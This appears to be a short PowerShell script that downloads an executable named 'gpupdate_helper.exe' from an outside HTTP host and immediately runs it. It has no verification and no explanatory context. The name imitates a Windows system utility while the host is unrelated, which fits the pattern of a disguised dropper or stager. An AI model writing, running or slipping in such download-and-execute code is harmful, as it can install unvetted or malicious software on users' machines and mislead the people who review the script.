$url = "http://shockwave-labs.com/files/gpupdate_helper.exe"
$outpath = "$PSScriptRoot/gpupdate_helper.exe"
Invoke-WebRequest -Uri $url -OutFile $outpath
Start-Process -FilePath $outpath 